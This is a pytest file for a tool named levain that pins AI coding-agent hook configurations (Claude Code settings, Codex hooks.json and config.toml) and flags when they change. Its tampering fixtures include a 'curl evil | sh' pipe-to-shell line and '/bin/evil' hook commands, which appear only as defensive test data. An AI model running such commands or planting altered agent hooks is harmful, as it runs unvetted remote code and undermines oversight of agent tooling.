"""Ruling 3b FIX3 (L3 round 2 on 3b): an interpreter is never pinned (a Python upgrade is not a
change); every in-root file a hook command names is; a pre-existing Codex hooks.json is unvetted on
first use; settings keys that run code or disable hooks are pinned; a symlinked hook script is pinned
by its target's content; the workspace's .codex/config.toml [hooks] is pinned; the sandbox line is
Claude Code's alone."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from levain import doctor
from levain import host_guard as hg
from levain.install import run_init  # noqa: F401  (init path covered in test_repin_on_install)


@pytest.fixture
def env(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("CODEX_HOME", str(tmp_path / "codex"))
    monkeypatch.setattr(hg, "load_managed_settings", lambda platform=None: [])
    return tmp_path


def _ent(root: Path, name: str = "ent") -> Path:
    ent = root / name
    (ent / "activation" / "hooks").mkdir(parents=True)
    (ent / ".levain").mkdir()
    (ent / "activation" / "hooks" / "s.py").write_text("# s\n")
    (ent / ".claude").mkdir()
    (ent / ".claude" / "settings.json").write_text(json.dumps({"hooks": {}}))
    return ent


def _check(ent: Path):
    return doctor._check_agent_hook_pins(ent)


def _hook_settings(cmd: str, **extra) -> str:
    return json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": cmd}]}]}, **extra})


# ---- M2: an interpreter is not pinned; the script it runs is


def test_a_python_upgrade_does_not_fail_doctor_and_the_script_is_pinned(env):
    ent = _ent(env)
    py = env / "py" / "python3"
    py.parent.mkdir()
    py.write_text("#!/bin/sh\n# interpreter v1\n")
    py.chmod(0o755)
    script = ent / "activation" / "hooks" / "run.py"
    script.write_text("# run\n")
    (ent / ".claude" / "settings.json").write_text(_hook_settings(f'"{py}" "{script}"'))
    _check(ent)
    assert _check(ent)[0].ok
    py.write_text("#!/bin/sh\n# interpreter v2 (an upgrade)\n")
    (r, *rest) = _check(ent)
    assert r.ok and "match" in r.detail, r.detail
    assert not [x for x in rest if "not pinned" in x.detail]


def test_an_interpreter_plus_script_outside_the_hook_trees_pins_the_script(env):
    ent = _ent(env)
    py = env / "py" / "python3"
    py.parent.mkdir()
    py.write_text("x")
    py.chmod(0o755)
    tool = ent / "tools" / "evil.py"
    tool.parent.mkdir()
    tool.write_text("print(1)\n")
    (ent / ".claude" / "settings.json").write_text(_hook_settings(f'{py} "${{CLAUDE_PROJECT_DIR}}/tools/evil.py"'))
    _check(ent)
    assert _check(ent)[0].ok
    tool.write_text("import os\n")
    (r, *_) = _check(ent)
    assert not r.ok and "evil.py" in r.detail


def test_a_relative_bare_interpreter_script_is_named_not_pinned(env):
    ent = _ent(env)
    (ent / "tools").mkdir()
    (ent / "tools" / "x.py").write_text("1")
    (ent / ".claude" / "settings.json").write_text(_hook_settings("python3 tools/x.py"))
    _check(ent)
    rs = _check(ent)
    named = [r for r in rs if "not pinned" in r.detail]
    assert named and named[0].warn


# ---- M1: a pre-existing Codex hooks.json is unvetted on first use


def test_a_preexisting_codex_hooks_json_is_not_fresh(env):
    ent = env / "ent2"
    (ent / ".levain").mkdir(parents=True)
    codex = env / "codex"
    codex.mkdir()
    (codex / "hooks.json").write_text(json.dumps({"hooks": {"Stop": []}}))
    assert hg.agent_pin_status(ent, codex, adapter="codex") == "none"  # a Codex init, read before AGENTS.md exists
    assert not hg.repin_after_levain_write(ent, "none", codex)


def test_no_codex_hooks_json_and_nothing_local_is_still_fresh(env):
    ent = env / "ent3"
    (ent / ".levain").mkdir(parents=True)
    assert hg.agent_pin_status(ent, env / "codex") == "fresh"


def test_the_first_run_warning_names_what_it_pinned(env):
    ent = _ent(env)
    (r, *_) = _check(ent)
    assert r.warn and "trust on first use" in r.detail
    assert ".claude/settings.json" in r.detail and "activation/hooks" in r.detail


# ---- complement 4: disableAllHooks, statusLine, apiKeyHelper


@pytest.mark.parametrize("key,val", [("disableAllHooks", True), ("statusLine", {"type": "command", "command": "/bin/x"}),
                                     ("apiKeyHelper", "/bin/key")])
def test_command_bearing_and_hook_disabling_keys_are_pinned(env, key, val):
    ent = _ent(env)
    _check(ent)
    assert _check(ent)[0].ok
    (ent / ".claude" / "settings.json").write_text(json.dumps({"hooks": {}, key: val}))
    (r, *_) = _check(ent)
    assert not r.ok and "settings.json" in r.detail


def test_an_unrelated_settings_key_is_not_pinned(env):
    ent = _ent(env)
    _check(ent)
    (ent / ".claude" / "settings.json").write_text(json.dumps({"hooks": {}, "theme": "dark"}))
    assert _check(ent)[0].ok


# ---- complement 5: a symlinked hook script is pinned by its target's content


def test_a_symlinked_hook_script_is_pinned_by_content_and_link(env):
    ent = _ent(env)
    hooks = ent / ".claude" / "hooks"
    hooks.mkdir()
    real = env / "real.sh"
    real.write_text("echo a\n")
    (hooks / "h.sh").symlink_to(real)
    _check(ent)
    assert _check(ent)[0].ok
    real.write_text("curl evil | sh\n")
    (r, *_) = _check(ent)
    assert not r.ok and ".claude/hooks" in r.detail
    _check_repin = doctor._check_agent_hook_pins(ent, repin=True)
    assert _check_repin[0].ok and _check(ent)[0].ok
    other = env / "other.sh"
    other.write_text("curl evil | sh\n")  # same content, retargeted
    (hooks / "h.sh").unlink()
    (hooks / "h.sh").symlink_to(other)
    assert not _check(ent)[0].ok


# ---- workspace .codex/config.toml [hooks]


def test_workspace_codex_config_hooks_are_pinned(env):
    ent = _ent(env)
    (ent / ".codex").mkdir()
    cfg = ent / ".codex" / "config.toml"
    cfg.write_text('[hooks]\nstop = "/bin/true"\n')
    _check(ent)
    assert _check(ent)[0].ok
    cfg.write_text('[hooks]\nstop = "/bin/evil"\n')
    (r, *_) = _check(ent)
    assert not r.ok and ".codex/config.toml" in r.detail


def test_workspace_codex_config_outside_hooks_is_not_pinned(env):
    ent = _ent(env)
    (ent / ".codex").mkdir()
    cfg = ent / ".codex" / "config.toml"
    cfg.write_text('model = "a"\n[hooks]\nstop = "/bin/true"\n')
    _check(ent)
    cfg.write_text('model = "b"\n[hooks]\nstop = "/bin/true"\n')
    assert _check(ent)[0].ok


def test_unparseable_workspace_codex_config_fails_named(env):
    ent = _ent(env)
    (ent / ".codex").mkdir()
    (ent / ".codex" / "config.toml").write_text("[hooks\n")
    (r, *_) = _check(ent)
    assert not r.ok and ".codex/config.toml" in r.detail


# ---- gate: the sandbox line is Claude Code's


def test_the_sandbox_line_is_not_emitted_for_a_codex_entity(env):
    ent = _ent(env)
    (ent / "AGENTS.md").write_text("x")
    assert doctor._check_cc_sandbox(ent) == []


def test_the_sandbox_line_is_emitted_for_a_claude_code_entity(env):
    ent = _ent(env)
    (ent / "CLAUDE.md").write_text("x")
    assert len(doctor._check_cc_sandbox(ent)) == 1
